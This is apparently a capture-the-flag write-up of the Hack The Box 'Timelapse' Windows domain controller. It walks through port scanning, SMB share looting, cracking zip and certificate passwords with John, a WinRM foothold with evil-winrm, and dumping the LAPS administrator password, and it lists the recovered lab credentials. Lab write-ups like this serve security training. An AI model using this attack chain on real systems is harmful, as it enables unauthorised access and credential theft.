# Nmap Scan

nmap -sC -sV 10.10.11.152 -o nmap/timelapse  -v -e tun0

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-04-20 03:04:44Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 8h00m01s
| smb2-time: 
|   date: 2022-04-20T03:04:54
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required


## Open Ports

PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl



Add timelapse.htb to /etc/hosts

![image](https://user-images.githubusercontent.com/129129988/228107977-f15d0ee4-4d38-4988-944f-bb0233b247f9.png)

running masscan also revealed PORT     STATE SERVICE  VERSION 
5986/tcp open  ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 
|_http-title: Not Found 
| ssl-cert: Subject: commonName=dc01.timelapse.htb 
| Issuer: commonName=dc01.timelapse.htb 
| Public Key type: rsa 
| Public Key bits: 2048 
| Signature Algorithm: sha256WithRSAEncryption
 

(WinRM) 
is a Microsoft protocol that allows remote management of Windows machines over HTTP(S) using SOAP. On the backend it's utilising WMI, so you can think of it as an HTTP based API for WMI.

The easiest way to detect whether WinRM is available is by seeing if the port is opened. WinRM will listen on one of two ports:

• 5985/tcp (HTTP)
• 5986/tcp (HTTPS)

## Service Enumeration

We dont have a webserver running but we do have SMB on port 139.

smbclient -L \\\\10.10.11.152\\ 

![image](https://user-images.githubusercontent.com/129129988/228108158-548a409b-a6e4-49e9-840a-af342b969111.png)

Enurating the Shares Folders I found 2 other folder Dev, and Help Desk
smbclient \\\\10.10.11.152\\Shares

![image](https://user-images.githubusercontent.com/129129988/228108216-76e218b5-0f11-4f00-b6bd-e19d9ad4ada6.png)

Within the Dev folder 
![image](https://user-images.githubusercontent.com/129129988/228108258-c4e2548e-240f-4d8f-9d7d-ccfaaeeb3647.png)


We can see a winrm_backup.zip

using the command get we can download the zip file. 
![image](https://user-images.githubusercontent.com/129129988/228108449-833aae2a-1ef5-453f-a6f2-bce3922b05fc.png)


We can also download all the contents in the HelpDesk we might use it later on. 
![image](https://user-images.githubusercontent.com/129129988/228108482-b1f1a1da-f473-4a3b-a273-20c147840418.png)

it looks like just some documentation. 

As for the zip file looks like its password protected. 

![image](https://user-images.githubusercontent.com/129129988/228108525-f73d9ecf-2b63-41fc-b370-bcc9b4967e8d.png)


also we can see the contents on the file legacyy_dev_auth.pfx 
After googling a little pfk file 

![image](https://user-images.githubusercontent.com/129129988/228108562-7c81c74a-2145-4ec8-a988-8ee05980524a.png)

looks like there is a way to extract .crt and .key form the .pfx file. 
We can use John to crack the password for the zip file 

First use zip2john command to create a file that john can use to crack the password. 

 zip2john winrm_backup.zip > hashZipPassword 

![image](https://user-images.githubusercontent.com/129129988/228108593-ea9c2b88-e692-4b24-9239-6ed1ca218dc7.png)


Now we can crack the password. 

john --wordlist=/usr/share/wordlists/rockyou.txt hashZipPassword

![image](https://user-images.githubusercontent.com/129129988/228108625-10c0f64f-4cd6-4bc7-aba6-c9b2f2b85852.png)

As you can see The password to the zip file is supremelegacy.

![image](https://user-images.githubusercontent.com/129129988/228108679-f8ec1877-c2d1-4be8-bb08-4d3aba008016.png)


Wow that we have the data file lets try to extract the key and cert. 
This command can analyse the .pfx and dump the key. 
openssl pkcs12 -in [yourfile.pfx] -nocerts -out [drlive.key]

So the .pfx file has an import password; After try the previous password this did not work. 

![image](https://user-images.githubusercontent.com/129129988/228108707-6b383091-06ef-480d-8282-793db338ef38.png)


john has alot of featuers one of which is the suffix 2john were we can crack pdf passwords as you saw zip and now pfx 
pfx2john legacyy_dev_auth.pfx > pfxPassword.txt

![image](https://user-images.githubusercontent.com/129129988/228108736-86427d12-77f1-4127-8cd6-e91d64e71a43.png)


Cracking the password for pfx  
john --wordlist=/usr/share/wordlists/rockyou.txt pfxPassword.txt 

![image](https://user-images.githubusercontent.com/129129988/228108768-40762d99-d89b-431f-82e2-c10005808df2.png)

Now we have the password for the pfx file. thuglegacy
We can learn more about the private key and public key here. 
https://tecadmin.net/extract-private-key-and-certificate-files-from-pfx-file/

MoreInfo - https://www.howtouselinux.com/post/pfx-file-with-examples


Using this new password, I obtained the private key file. 
Private.key
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out prv.key


![image](https://user-images.githubusercontent.com/129129988/228108797-4ad57284-c7b8-42ac-9c6f-8240aa2b1c64.png)

![image](https://user-images.githubusercontent.com/129129988/228108823-25692306-bc56-4667-be40-3db0c57b8a4c.png)


Certificate.crt
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out certificate.crt

![image](https://user-images.githubusercontent.com/129129988/228108874-bd01b6bf-8953-489d-98aa-7117af58d3a3.png)


# Foothold
WinRM is on port 5986. We can use the evil-winrm tool to connect. 

evil-winrm -i 10.10.11.152 -S -c certificate.crt -k prv.key -p -u

![image](https://user-images.githubusercontent.com/129129988/228109055-980b9f4b-cce2-438e-8257-c0e73395006e.png)


The -S parameter refers to the ssl parameter connection, -c is the public key, -k is the private key, -p and -u are the username and password, respectively

Navigate to Desktop to get user.txt 

# Privesc to Root

Furthermore we have a couple of Users;
![image](https://user-images.githubusercontent.com/129129988/228109171-9240b154-9133-4703-9feb-362d6fc93cc7.png)

svc_deploy looks intresting, and legacyy

download winpeas inside the same directory you got a shell in using evil-winrm
Download Link:
https://github.com/carlospolop/PEASS-ng/releases/download/20220417/winPEASx64.exe

now type 
upload <winPeas_File>

![image](https://user-images.githubusercontent.com/129129988/228109207-e8f692a9-a860-4f78-a88e-6ee95e2b071e.png)


After further enumeration on the box, I found  ConsoleHost_history.txt in 
C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\Powershell\PSReadLine

![image](https://user-images.githubusercontent.com/129129988/228109227-84194fce-79d7-4dd3-8fd7-d41d5a3f2b0c.png)


view this we can see that we have another user named svc_deploy 
with the password: E3R$Q62^12p7PLlC%KWaxuaV
$c -port 5986 -usessl

Reffering back to the files that we downloaded it has a title LAPS; using a little bit of google I found that we can dump passwords for loacal Administrator is if we have access to username and password on domain. 
https://www.n00py.io/2020/12/dumping-laps-passwords-from-linux/
 
Google Search LAPS Meaning: 
"The Local Administrator  Password Solution (LAPS) provides a solution to this issue of using a  common local account with an identical password on every computer in a  domain. LAPS resolves this issue by setting a different, random password for the common local administrator account on every computer in the domain."

We can try to dump password for admin account, by dumping the LAPS
https://github.com/n00py/LAPSDumper

Inside the article we have the link to the github
clone the repository then 
python3 laps.py -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -d timelapse.htb

![image](https://user-images.githubusercontent.com/129129988/228109274-1221eb79-d399-4266-95dc-b59221493382.png)


You can see we have the updated hash:
4f6ot8,Tn%Iu2H91px}Kzu+4
password for Administrator

![image](https://user-images.githubusercontent.com/129129988/228109296-569d3f35-a053-41e3-8e7e-6ea716b557b9.png)

I found the rootFlag 

![image](https://user-images.githubusercontent.com/129129988/228109335-f0f81aef-f787-49dd-b29b-6507c935d340.png)

![image](https://user-images.githubusercontent.com/129129988/228109353-bf0629d5-8ba4-446c-8988-04138e761fb1.png)



